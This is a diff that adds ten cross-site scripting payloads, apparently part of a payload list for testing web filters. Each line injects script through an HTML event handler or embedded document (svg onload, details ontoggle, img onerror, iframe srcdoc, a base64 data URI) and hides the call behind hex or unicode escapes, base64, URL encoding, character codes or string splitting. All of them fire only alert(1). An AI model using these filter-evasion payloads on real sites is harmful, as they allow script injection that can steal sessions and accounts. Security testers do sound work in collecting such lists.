@@ -1,0 +1,10 @@
+<svg onload=window['\x61\x6c\x65\x72\x74'](`\x31`)>
+<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9ZXZhbCgnYWxlcnQoMSknKT48L3N2Zz4+></object>
+<details open ontoggle=Function('\u0061\u006c\u0065\u0072\u0074(1)')()></details>
+<details open ontoggle=eval(atob('YWxlcnQoMSk='))></details>
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></svg>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>"></iframe>
+<img src=x onerror=window['al'+'ert'](`\x31`)>
+<svg onload=Function('window["al"+"ert"](1)')()></svg>
+<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></details>
